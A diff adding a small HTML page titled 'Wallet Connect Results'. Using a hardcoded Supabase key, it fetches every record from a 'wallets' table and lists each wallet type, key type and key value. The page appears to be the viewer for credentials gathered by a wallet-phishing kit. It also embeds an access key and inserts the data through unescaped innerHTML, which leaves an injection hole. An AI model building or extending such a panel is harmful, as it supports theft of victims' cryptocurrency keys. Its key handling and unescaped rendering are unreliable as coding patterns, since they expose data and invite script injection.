@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supabase Data Fetch and Display</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+
+    <style>
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: center;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+    </style>
+    
+</head>
+<body>
+    <h1>Wallet Connect Results</h1>
+    <table id="data-table">
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Wallet Type</th>
+                <th>Key</th>
+                <th>Value</th>
+            </tr>
+        </thead>
+        <tbody>
+            <!-- Data will be inserted here -->
+        </tbody>
+    </table>
+
+
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        // Initialize Supabase client
+        const SUPABASE_URL = "https://liqvehozsqomoftifbgf.supabase.co"
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxpcXZlaG96c3FvbW9mdGlmYmdmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTg5OTk4MjQsImV4cCI6MjAzNDU3NTgyNH0.PRnvTO9zE_X-FvVQuznnAQf0k_TIuyZ7xc7O13s0h6Y"
+
+        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        async function fetchData() {
+            // Fetch data from Supabase
+            const { data, error } = await _supabase
+                .from('wallets')
+                .select('*');
+
+            if (error) {
+                console.error('Error fetching data:', error);
+                return;
+            }
+
+            // Populate table with data
+            const tableBody = document.querySelector('#data-table tbody');
+            data.forEach(item => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${item.id}</td>
+                    <td>${item.wallet_type}</td>
+                    <td>${item.key_type}</td>
+                    <td>${item.key_value}</td>
+                `;
+                tableBody.appendChild(row);
+            });
+        }
+
+        // Fetch data on page load
+        fetchData();
+    });
+</script>
+</body>
+</html>
